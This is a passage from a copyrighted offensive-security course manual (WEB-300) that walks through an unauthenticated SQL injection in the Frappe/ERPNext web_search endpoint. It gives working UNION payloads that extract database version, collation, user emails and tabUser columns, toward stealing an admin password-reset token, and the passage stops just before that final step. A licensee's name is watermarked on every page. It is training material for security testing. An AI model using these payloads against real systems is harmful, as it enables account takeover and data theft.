understand this, we can look at how Frappe defines DocTypes,111 or generic objects containing 
metadata that describe how Frappe handles data: 
A DocType is the core building block of any application based on the Frappe 
Framework. It describes the Model and the View of your data. It contains what 
fields are stored for your data, and how they behave with respect to each other. It 
contains information about how your data is named. It also enables rich Object 
Relational Mapper (ORM) pattern… 
The use of a DocType in this way suggests that Frappe follows a low-level, metadata-driven 
pattern that applies some principles of MVC. Certain vulnerabilities stem from developers not 
following an implemented pattern. To learn how to discover these types of vulnerabilities, we 
should further discuss metadata-driven patterns. 
8.2.2 Metadata-driven Design Patterns 
A metadata-driven design pattern creates a layer of abstraction that eases the new application 
development process. This works well for generic database-driven applications112 like ERP 
software that allows users to customize stored data. 
 
108 (Norfolk, 2015), https://www.youtube.com/watch?v=o_TH-Y78tt4&t=1667 
109 (Wikipedia, 2019), https://en.wikipedia.org/wiki/ERPNext#Architecture 
110 (Github, 2014), https://github.com/frappe/frappe/blob/develop/frappe/core/doctype/doctype/README.md 
111 (Frappe, 2020), https://frappe.io/docs/user/en/understanding-doctypes 
112 (Zhang, 2017), https://ebaas.github.io/blog/MetadataDrivenArchitecture/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
249 
8.2.2.1.1 
 
Salesforce113 is big proponent of a metadata-driven design as their use case 
enables multiple customers to have a customized version of their application 
suite. 
In a metadata-driven pattern, the application generates the necessary components to manage the 
data based on the metadata, including those necessary to perform Create, Read, Update, and 
Delete114 (CRUD) operations on the data.115 
We can tell from the use of DocTypes that Frappe follows a metadata-driven design pattern.116 
Using DocTypes in this way helps developers reuse a single full-featured application or framework 
for multiple types of industries and business models. 
Programming in this manner is much more difficult than traditional programming117 and can 
result in more “spaghetti code”. However, once the core of the framework/application is built, 
building additional features and data types is much easier. This creates the layer of abstraction in 
the form of metadata (DocTypes) that is used to store data in the database. 
 
Figure 188: Frappe Metadata-Driven Model 
Essentially, the Frappe “Kernel” grabs and parses the DocTypes to create the appropriate tables in 
the database. One common goal of metadata-driven applications is to allow for the creation of 
the metadata documents via a GUI.118 This concept is also displayed in ERPNext by logging in and 
searching for “DocType” in the search bar. Clicking on DocType List shows a list of all DocTypes. 
 
113 (Salesforce, 2020), https://www.salesforce.com 
114 (Wikipedia, 2020) https://en.wikipedia.org/wiki/Create,_read,_update_and_delete 
115 (Salesforce, 2008), https://www.developerforce.com/media/ForcedotcomBookLibrary/Force.com_Multitenancy_WP_101508.pdf 
116 (ERPNext, 2019), https://discuss.erpnext.com/t/which-design-pattern-is-followed-by-frappe-developers-building-the-
framework/41662/3 
117 (Stackexchange, 2017), https://softwareengineering.stackexchange.com/a/357202 
118 (Zhang, 2017), https://ebaas.github.io/blog/MetadataDrivenArchitecture/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
250 
 
Figure 189: Listing all DocTypes 
We can click on any of the DocTypes to inspect the details contained within. The listing below 
displays clicking on the “Stock Entry Detail” DocType. 
 
Figure 190: Stock DocType 
While it is possible to create a DocType by clicking New in the top right corner, this particular 
DocType was created during installation and can be found in the application’s code at: 
apps/erpnext/erpnext/stock/doctype/stock_entry_detail/stock_entry_detail.json 
Listing 251 - Path to stock_entry_detail.json 
Below, we have the DocType open in Visual Studio Code. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
251 
 
Figure 191: Viewing DocType JSON 
DocTypes in Frappe are also accompanied by .py files that contain additional logic and routes 
that support additional features. For example, the bank account DocType found in 
apps/erpnext/erpnext/accounts/doctype/bank_account/ contains bank_account.py, which adds 
three functions for the application to use: 
1. 
make_bank_account 
2. 
get_party_bank_account 
3. 
get_bank_account_details 
Referring back to the documentation about DocTypes in Frappe, it states: “DocType is the basic 
building block of an application and encompasses all the three elements i.e. model, view and 
controller”. The DocType encompasses the model element of MVC with a table in the database. 
The view is the DocType’s ability to be edited and displayed as a form (this includes the ability to 
edit the DocType within the UI). Finally, the DocType acts as a controller by making use of the .py 
files that accompany the DocType. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
252 
 
Figure 192: Bank Account DocType 
Frameworks and applications that use a metadata-driven pattern need to be very flexible for use 
across various configurations. Because of this, interesting challenges and even more interesting 
solutions appear. One such solution is Frappe’s choice for HTTP routing. Notice that the DocType 
Python file contained a string “@frappe.whitelist()” above each method. This is one of the 
methods that Frappe uses to route HTTP requests to the appropriate functions. We will use this 
information later to discover a SQL injection vulnerability. 
8.2.3 HTTP Routing in Frappe 
In modern web applications, HTTP routing is used to map HTTP requests to their corresponding 
functions. For example, if a GET request to /user runs a function to obtain the current user’s 
information, that route must be defined somewhere in the application. 
Frappe uses a Python decorator with the function name whitelist to expose API endpoints.119 This 
function is defined in apps/frappe/frappe/__init__.py. 
470  whitelisted = [] 
471  guest_methods = [] 
472  xss_safe_methods = [] 
473  def whitelist(allow_guest=False, xss_safe=False): 
474          """ 
475          Decorator for whitelisting a function and making it accessible via HTTP. 
 
119 (Github, 2019), https://github.com/frappe/frappe/wiki/Developer-Cheatsheet#how-to-make-public-api 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
253 
476          Standard request will be `/api/method/[path.to.method]` 
477 
478          :param allow_guest: Allow non logged-in user to access this method. 
479 
480          Use as: 
481 
482                  @frappe.whitelist() 
483                  def myfunc(param1, param2): 
484                          pass 
485          """ 
486          def innerfn(fn): 
487                  global whitelisted, guest_methods, xss_safe_methods 
488                  whitelisted.append(fn) 
489 
490                  if allow_guest: 
491                          guest_methods.append(fn) 
492 
493                          if xss_safe: 
494                                  xss_safe_methods.append(fn) 
495 
496                  return fn 
497 
498          return innerfn 
499 
Listing 252 - Whitelist function in __init__.py 
Essentially, when a function has the “@frappe.whitelist()” decorator above it, the whitelist function 
is executed and the function being called is added to a list of whitelisted functions (line 488), 
guest_methods (line 490-491), or xss_safe_methods (line 493-494). This list is then used by the 
handler found in the apps/frappe/frappe/handler.py file. An HTTP request is first processed by the 
handle function. 
15  def handle(): 
16          """handle request""" 
17          cmd = frappe.local.form_dict.cmd 
18          data = None 
19 
20          if cmd!='login': 
21                  data = execute_cmd(cmd) 
22 
23          # data can be an empty string or list which are valid responses 
24          if data is not None: 
25                  if isinstance(data, Response): 
26                          # method returns a response object, pass it on 
27                          return data 
28 
29                  # add the response to `message` label 
30                  frappe.response['message'] = data 
31 
32          return build_response("json") 
33 
Listing 253 - Handle function in handler.py 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
254 
First, the handle function extracts the cmd that the request is attempting to execute (line 17). This 
value is obtained from the frappe.local.form_dict.cmd variable. As long as the command (cmd) is 
not “login” (line 20), the command is passed to the execute_cmd function (line 21). 
34  def execute_cmd(cmd, from_async=False): 
35          """execute a request as python module""" 
36          for hook in frappe.get_hooks("override_whitelisted_methods", {}).get(cmd, 
[]): 
37                  # override using the first hook 
38                  cmd = hook 
39                  break 
40 
41          try: 
42                  method = get_attr(cmd) 
43          except Exception as e: 
44                  if frappe.local.conf.developer_mode: 
45                          raise e 
46                  else: 
47                          frappe.respond_as_web_page(title='Invalid Method', 
html='Method not found', 
48                          indicator_color='red', http_status_code=404) 
49                  return 
50 
51          if from_async: 
52                  method = method.queue 
53 
54          is_whitelisted(method) 
55 
56          return frappe.call(method, **frappe.form_dict) 
Listing 254 - execute_cmd function in handler.py 
The execute_cmd function will attempt to find the command and return the method (line 42). If 
the method was found, Frappe will check if it is whitelisted (line 54) using the whitelisted list. If it 
is found, the function is executed. We can inspect this process in the is_whitelisted function. 
59  def is_whitelisted(method): 
60          # check if whitelisted 
61          if frappe.session['user'] == 'Guest': 
62                  if (method not in frappe.guest_methods): 
63                          frappe.msgprint(_("Not permitted")) 
64                          raise frappe.PermissionError('Not Allowed, 
{0}'.format(method)) 
65 
66                  if method not in frappe.xss_safe_methods: 
67                          # strictly sanitize form_dict 
68                          # escapes html characters like <> except for predefined 
tags like a, b, ul etc. 
69                          for key, value in frappe.form_dict.items(): 
70                                  if isinstance(value, string_types): 
71                                          frappe.form_dict[key] = 
frappe.utils.sanitize_html(value) 
72 
73          else: 
74                  if not method in frappe.whitelisted: 
75                          frappe.msgprint(_("Not permitted")) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
255 
76                          raise frappe.PermissionError('Not Allowed, 
{0}'.format(method)) 
Listing 255 - is_whitelisted function in handler.py 
The is_whitelisted method simply checks to ensure the function being executed is in the list of 
whitelisted functions. 
This means that the client can call any Frappe function directly if the @frappe.whitelist() decorator 
is in use for that function. In addition, if “allow_guest=True” is also passed in the decorator, the 
user does not have to be authenticated to run the function. 
If the is_whitelisted function does not raise any exceptions, the execute_cmd function will call 
frappe.call and pass all the arguments in the request to the function (line 56 of handler.py). 
Let’s load a page and attempt to discover what a request that calls the function directly looks like. 
To do this, we will open Burp and configure Firefox to use it as a proxy. When the root page of 
ERPNext is loaded, we will capture a request that attempts to run a Python function directly. The 
request we capture is triggered automatically on page load. 
 
Figure 193: Capturing Direct Function Execution Request 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
256 
8.2.3.1.1 
 
The command in Figure 193 that attempts to execute can be found in Listing 256. 
frappe.website.doctype.website_settings.website_settings.is_chat_enabled 
Listing 256 - cmd from captured request 
Searching for the is_chat_enabled function within the code leads us to the following file: 
apps/frappe/frappe/website/doctype/website_settings/website_settings.py 
Listing 257 - Location of the is_chat_enabled function 
We can open this file in Visual Studio Code to reveal the is_chat_enabled function. 
 
Figure 194: is_chat_enabled in website_settings.py 
Frappe uses the directory structure to find the file and function to execute, as shown in Listing 
258. 
frappe.website.doctype.website_settings.website_settings.is_chat_enabled 
apps/frappe/frappe/website/doctype/website_settings/website_settings.py 
Listing 258 - Comparing cmd to file structure 
Based on the function code, we’ll notice the is_chat_enabled function also contains 
“@frappe.whitelist(allow_guest=True)”, which allows the command to be executed by an 
unauthenticated user. 
144  @frappe.whitelist(allow_guest=True) 
145  def is_chat_enabled(): 
146          return bool(frappe.db.get_single_value('Website Settings', 
'chat_enable')) 
Listing 259 - Reviewing is_chat_enabled function 
Now that we know how a request is handled, we can move forward in the vulnerability discovery 
process. The designation of guest-accessible routes will allow us to create a list of starting points 
to search for vulnerabilities that could lead to authentication bypass. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
257 
8.2.3.2 Exercise 
Now that we know how the functions are executed, find all whitelisted, guest-allowed functions. 
8.3 Authentication Bypass Discovery 
Now that the results of the previous exercise provide us with a manageable list of endpoints that 
are accessible by unauthenticated users, we can begin hunting for vulnerabilities. However, we 
still need a methodology to review the results. One way of doing this is to search for functions 
that break the MVC or metadata-driven pattern. Since the list of endpoints represents the user’s 
direct interaction with the application, we can treat these as controllers. Searching for direct 
modifications of the model or view in the controller could point us in the direction of a 
vulnerability. We could accomplish this by searching for SQL queries directly in the whitelisted 
functions. 
8.3.1 Discovering the SQL Injection 
Searching for SQL in the 91 guest-whitelisted results, we quickly find the web_search function in 
the apps/frappe/frappe/utils/global_search.py file. 
 
Figure 195: Finding web_search in global_search.py 
The function begins by defining four arguments: text, scope, start, and limit: 
459  @frappe.whitelist(allow_guest=True) 
460  def web_search(text, scope=None, start=0, limit=20): 
461          """ 
462          Search for given text in __global_search where published = 1 
463          :param text: phrase to be searched 
464          :param scope: search only in this route, for e.g /docs 
465          :param start: start results at, default 0 
466          :param limit: number of results to return, default 20 
467          :return: Array of result objects 
468          """ 
Listing 260 - Reviewing web_search function - definition 
Next, the web_search function splits the text variable into a list of multiple search strings and 
begins looping through them. 
470          results = [] 
471          texts = text.split('&') 
472          for text in texts: 
Listing 261 - Reviewing web_search function - splitting 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
258 
Within the for loop, the query string is set and the string is formatted. However, not all of the 
parameters are appended to the query in the same way. 
473               common_query = ''' SELECT `doctype`, `name`, `content`, `title`, 
`route` 
474                       FROM `__global_search` 
475                       WHERE {conditions} 
476                       LIMIT {limit} OFFSET {start}''' 
477 
478               scope_condition = '`route` like "{}%" AND '.format(scope) if scope 
else '' 
479               published_condition = '`published` = 1 AND ' 
480               mariadb_conditions = postgres_conditions = ' 
'.join([published_condition, scope_condition]) 
481 
482               # https://mariadb.com/kb/en/library/full-text-index-overview/#in-
boolean-mode 
483               text = '"{}"'.format(text) 
484               mariadb_conditions += 'MATCH(`content`) AGAINST ({} IN BOOLEAN 
MODE)'.format(frappe.db.escape(text)) 
485               postgres_conditions += 'TO_TSVECTOR("content") @@ 
PLAINTO_TSQUERY({})'.format(frappe.db.escape(text)) 
486 
487               result = frappe.db.multisql({ 
488                       'mariadb': 
common_query.format(conditions=mariadb_conditions, limit=limit, start=start), 
489                       'postgres': 
common_query.format(conditions=postgres_conditions, limit=limit, start=start) 
490               }, as_dict=True) 
Listing 262 - Reviewing web_search function - SQL 
On lines 484 and 485, the text is appended to the query using the format function but the string is 
first passed into a frappe.db.escape function. However, on lines 480, 488, and 489, the 
parameters are not escaped, potentially allowing us to inject SQL. This means that we could SQL 
inject the scope, limit, and start arguments. 
Let’s first modify the request we currently have that runs a Python function to execute 
web_search and set a breakpoint on it to pause on execution. 
To pause execution early in the web_search function, we will place the breakpoint on line 470 next 
to the line that reads “results = section-6”. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
259 
 
Figure 196: Setting Breakpoint on Line 470 
Next, we will send the is_chat_enabled request to Repeater and modify it to run the web_search 
function. 
 
Figure 197: Sending Request to Repeater 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
260 
8.3.1.1.1 
 
Once in Repeater, we need to modify the request to match the file path and the function call. The 
file path for the web_search function is apps/frappe/frappe/utils/global_search.py and would 
make the cmd call “frappe.utils.global_search.web_search”. 
 
Figure 198: Setting the cmd Variable 
The only variable in the web_search function that does not have a default value is text. We will set 
this in the Burp request by adding an ampersand (&) after the cmd value, and we will set the text 
variable to “offsec” as shown in Figure 199. 
 
Figure 199: Partial Payload in Burp 
With everything configured, we can send the request off by clicking Send in Burp. We should 
capture the request in Visual Studio Code’s debugger. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
261 
 
Figure 200: Triggering the Breakpoint on web_search 
With the breakpoint triggered, we can continue execution by pressing the Resume button or % on 
the keyboard. This will return a response in Burp with a JSON object containing the message 
object and an empty array. 
Now that we can trigger the request while observing what is happening, we can start trying to 
exploit the SQL injection. To do this, we will first remove the breakpoint on line 470 and add a new 
breakpoint on line 487 where the query is sent to the multisql function as shown in Listing 263. 
This will allow us to inspect the query just before it is executed. 
result = frappe.db.multisql({ 
    'mariadb': common_query.format(conditions=mariadb_conditions, limit=limit, 
start=start), 
    'postgres': common_query.format(conditions=postgres_conditions, limit=limit, 
start=start) 
}, as_dict=True) 
Listing 263 - Running the multisql function on Line 487 
We will send the Burp request again, stop execution at the breakpoint, and past the formatting to 
enter into the frappe.db.multisql function. From this function, we can inspect the full SQL 
command just before it is executed. 
First, let’s send the request again clicking Send in Burp. This will stop execution on line 487. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
262 
 
Figure 201: Pausing Execution on Line 487 
We can Step Over the next three execution steps as those are preparing and formatting the query 
before passing it into the frappe.db.multisql function. 
 
Figure 202: Pausing Execution on Line 487 
On the fourth execution step (line 490), we will Step Into the frappe.db.multisql function. 
 
Figure 203: Stepping into multisql Function 
This will take us into the apps/frappe/frappe/database/database.py file. From here, we can open 
the debugging tab, expand the sql_dict variable, and examine the SQL query before it is executed. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
263 
 
Figure 204: Viewing sql_dict in Debugger 
A cleaned-up version of the SQL query can be found in Listing 264 below. 
SELECT `doctype`, `name`, `content`, `title`, `route` 
  FROM `__global_search` 
  WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE) 
  LIMIT 20 OFFSET 0 
Listing 264 - Cleaned up initial SQL command 
With the SQL query captured, let’s click Resume in the debugger to continue execution. We can 
also confirm that this is the SQL query the database executed by returning to the mysql.log file. 
frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log 
   1553 Connect   _1bd3e0294da19198@localhost as anonymous on  
   1553 Query     SET AUTOCOMMIT = 0 
   1553 Init DB   _1bd3e0294da19198 
   1553 Query     select `user_type`, `first_name`, `last_name`, `user_image` from 
`tabUser` where `name` = 'Guest' order by modified desc 
   1553 Query     SELECT `doctype`, `name`, `content`, `title`, `route` 
          FROM `__global_search` 
          WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN 
MODE) 
          LIMIT 20 OFFSET 0 
   1553 Query     rollback 
   1553 Query     START TRANSACTION 
   1553 Quit 
Listing 265 - Database log for web_search function 
With the initial query generated, we can start using the other potentially-vulnerable parameters 
like scope. Let’s set the scope variable to a value and examine how the query changes. We will set 
the value to “offsec_scope”. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
264 
Using values like “offsec_scope” allows us to have a unique token that we are in 
control of. This allows us to grep through logs and query in databases if needed. 
If a value of “test” was used, we might have a lot of false positives if we need to 
grep for it. 
 
Figure 205: Setting Scope Variable 
With the scope variable set, we can pull the SQL command again from either the database logs or 
the breakpoint set in the code. 
SELECT `doctype`, `name`, `content`, `title`, `route` 
  FROM `__global_search` 
  WHERE `published` = 1 AND  `route` like "offsec_scope%" AND MATCH(`content`) AGAINST 
('\"offsec\"' IN BOOLEAN MODE) 
  LIMIT 20 OFFSET 0 
Listing 266 - SQL query with scope variable 
With the SQL command extracted, next we need to: 
1. 
Terminate the double quote. 
2. 
Add a UNION statement to be able to extract information. 
3. 
Comment out the remaining SQL command. 
Since the SQL query has five parameters (doctype, name, content, title, and route), we know that 
our UNION injection will have five parameters. The SQL injection payload can be found in Listing 
267. 
offsec_scope" UNION ALL SELECT 1,2,3,4,5# 
Listing 267 - Initial SQL injection payload 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
265 
The payload starts with the offsec_scope variable. Next, we’ll terminate the double quote, add the 
UNION query that will return five numbers, and finally comment out the rest of the query with a “#” 
character. Let’s send this payload and inspect the response. 
 
Figure 206: Initial SQL Injection Payload in Burp 
The payload with the injection has the response shown in Listing 268. With this, we know where 
we can inject additional queries to pull necessary information. 
{"message":[{"route":"5","content":"3","relevance":0,"name":"2","title":"4","doctype":
"1"}]} 
Listing 268 - Response to SQL injection 
We can extract the SQL query again from the debugger or the database logs. 
SELECT `doctype`, `name`, `content`, `title`, `route` 
  FROM `__global_search` 
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,5#%" 
AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE) 
  LIMIT 20 OFFSET 0 
Listing 269 - SQL query with injection 
Anything after the “5” is commented out and will be ignored. Next, let’s attempt to extract the 
version of the database by replacing the “5” with “@@version”. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
266 
 
Figure 207: SQL Injection to Extract Version 
The query returns the version found in Listing 270, which confirms the SQL injection. 
10.2.24-MariaDB-10.2.24+maria~xenial-log 
Listing 270 - Database software version 
Next, let’s figure out what information we need to extract to obtain a higher level of access to the 
application. 
8.3.1.2 Exercises 
1. 
Recreate the SQL injection. 
2. 
Attempt to discover how the web_search function is used in the UI. Would it have been 
possible to discover this kind of vulnerability in a black box assessment? 
8.4 Authentication Bypass Exploitation 
At this point, we have achieved SQL injection into a SELECT statement. Now we need to figure out 
how to leverage it to escalate our privileges. Let’s attempt to login as the administrator account. 
PyMysql, the Python MySQL client library,120 does not allow multiple queries in one execution 
unless “multi=True” is specified in the execute function. Searching through the code, it does not 
appear that “multi=True” is set. This means that we have to stick with the SELECT query we 
currently have and cannot INSERT new rows or UPDATE existing rows in the database. 
 
120 (MySQL, 2020), https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlcursor-execute.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
267 
Frappe passwords are hashed121 with PBK DF2.122 While it might be possible to crack the 
passwords, an easier route might be to hijack the password reset token. Let’s visit the homepage 
to verify that Frappe does indeed have password reset functionality. 
 
Figure 208: Frappe Password Reset 
Next, we’ll determine what tables to query to extract the password reset token value. 
8.4.1 Obtaining Admin User Information 
The Frappe documentation for passwords states that Frappe keeps the name and password in 
the __Auth table.123 However, this table does not have a field for the password reset key, so we’ll 
have to search the database for the key location. 
Since Frappe uses a metadata-driven pattern, the database has a lot of tables. We could find the 
user table by simply using the application as intended and inspecting the logs for submitted data. 
For this section, we want to figure out where the reset key is stored. 
Let’s visit the password reset page by clicking on the “Forgot Password?” link on the login page. 
From here, we can use a token value to reset the password. This token will allow us to more 
easily search through the logs to find the correct entry. We will use the email 
“token_searchForUserTable@mail.com” as the token. 
 
121 (Frappe, 2020), https://frappe.io/docs/user/en/users-and-permissions#password-hashing 
122 (Wikipedia, 2020), https://en.wikipedia.org/wiki/PBKDF2 
123 (Frappe, 2020), https://frappe.io/docs/user/en/users-and-permissions#password-hashing 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
268 
 
Figure 209: Password Reset for Token 
Before clicking Send Password, we will also start a command to follow the database logs and 
grep for our token as shown in Listing 271. 
Next, let’s click Send Password and we will receive an error. We will find that the database log 
command displays an entry. 
frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log | grep token_searchForUserTable 
  4980 Query     select * from `tabUser` where `name` = 
'token_searchForUserTable@mail.com' order by modified desc 
Listing 271 - Discovered table for password reset 
We have just discovered the tabUser table. 
8.4.2 Resetting the Admin Password 
Now that we know which tables we need to target, let’s create a SQL query to extract the 
email/name of the user. The documentation says that the email can be found in the name 
column in the __Auth table. A non-SQL injection query would be similar to the one found in Listing 
272. 
SELECT name FROM __Auth; 
Listing 272 - Standard query for extracting the name/email 
However, we need the query in Listing 272 to be usable in the UNION query. For this, we need to 
replace one of the numbers with the name column and add a “FROM __Auth” to the end of the 
UNION query. The query we are attempting to execute can be found in Listing 273. 
SELECT `doctype`, `name`, `content`, `title`, `route` 
  FROM `__global_search` 
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name 
FROM __Auth#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE) 
  LIMIT 20 OFFSET 0 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
269 
Listing 273 - Target query we are attempting to execute 
The highlighted part in Listing 273 will be the payload to the SQL injection. Next, we will place the 
payload in Burp, send the request, and inspect the response. 
 
Figure 210: SQL Injection Collation Error 
This is where we run into our first error. Frappe responds with the error “Illegal mix of collations 
for operation ‘UNION’”. 
Database collation describes the rules determining how the database will compare characters in 
a character set. For example, there are collations like “utf8mb4_general_ci” that are case-
insensitive (indicated by the “ci” at the end of the collation name). These collations will not take 
the case into consideration when comparing values.124 
It is possible for us to force a collation within the query. However, we first need to discover the 
collation used in the __global_search table that we are injecting into. We can do this using the 
query found in Listing 274. 
 
124 (database.guide, 2018), https://database.guide/what-is-collation-in-databases/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
270 
SELECT COLLATION_NAME  
FROM information_schema.columns  
WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"; 
Listing 274 - Query to discover collation 
Since this is a whitebox assessment, we could run the query in Listing 274 directly on the host. 
However, the collation across builds and versions of an application might be different. It is best 
practice to extract values like the collation directly from the host we are targeting. For this reason, 
we will use our SQL injection to extract the collation. 
Like the previous payload, we have to change this query to fit into a UNION query. We want the 
final query to be like the one found in Listing 275. 
SELECT `doctype`, `name`, `content`, `title`, `route` 
  FROM `__global_search` 
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 
1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = 
"__global_search" AND COLUMN_NAME = "name"#%" AND MATCH(`content`) AGAINST 
('\"offsec\"' IN BOOLEAN MODE) 
  LIMIT 20 OFFSET 0 
Listing 275 - Full query to discover collation 
The highlighted part in Listing 275 will become the payload we send in Burp. 
 
Figure 211: Discovering Collation via SQLi 
This request returns the value of “utf8mb4_general_ci” as the collation for the name column in the 
__global_search table. With this information, let’s edit our previous payload to include the 
“COLLATE utf8mb4_general_ci” command. The query we are attempting to run is as follows: 
SELECT name COLLATE utf8mb4_general_ci FROM __Auth; 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
271 
Listing 276 - Standard query for extracting the name/email with collation 
This makes the final query similar to the one found in Listing 277. 
SELECT `doctype`, `name`, `content`, `title`, `route` 
  FROM `__global_search` 
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name 
COLLATE utf8mb4_general_ci FROM __Auth#%" AND MATCH(`content`) AGAINST ('\"offsec\"' 
IN BOOLEAN MODE) 
  LIMIT 20 OFFSET 0' 
Listing 277 - SQL injection query with collation 
Sending this payload in Burp allows us to extract the name/email from the database. 
 
Figure 212: Extracting the name/email from Database 
This returns the response shown in Listing 278. 
{"message":[{"route":"Administrator","content":"3","relevance":0,"name":"2","title":"4
","doctype":"1"},{"route":"zeljka.k@randomdomain.com","content":"3","relevance":0,"nam
e":"2","title":"4","doctype":"1"}]} 
Listing 278 - Extracting the users 
Based on the response, the email we used to create the admin user was discovered. This is the 
account that we will target for the password reset. We can enter the email in the Forgot Password 
field. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
272 
 
Figure 213: Email in Password Reset Field 
Selecting Send Password will create the password reset token for the user and send an email 
about the password reset. 
 
Figure 214: Password Reset Complete 
Next, we can use the SQL injection to extract the reset key. We know that the reset key is 
contained in the tabUser table, but we don’t know which column yet. To find the column, we will 
use the query in Listing 279. 
SELECT COLUMN_NAME  
FROM information_schema.columns  
WHERE TABLE_NAME = "tabUser"; 
Listing 279 - Query to discover password reset column 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
273 
Again, we need to make this conform to the UNION query. 
SELECT `doctype`, `name`, `content`, `title`, `route` 
  FROM `__global_search` 
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 
1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#%" 
AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE) 
  LIMIT 20 OFFSET 0' 
Listing 280 - Finding table name for password reset 
The highlighted part displayed above is the payload that we’ll send in Burp via the scope variable. 
 
Figure 215: SQLi to Obtain List of Column Names 
Sending that SQL injection payload returns the JSON found in Listing 281. 
{"message":[{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":
"name"},...,{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":
"birth_date"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route
":"reset_password_key"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":
"1","route":"email"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1"
,"route":"_comments"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1
","route":"allowed_in_mentions"}]} 
Listing 281 - List of column names 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
274 
From the list of columns, we notice reset_password_key. We can use this column name to extract 
the password reset key. We should also include the name column to ensure that we are obtaining 
the reset key for the correct user. The query for this is: 
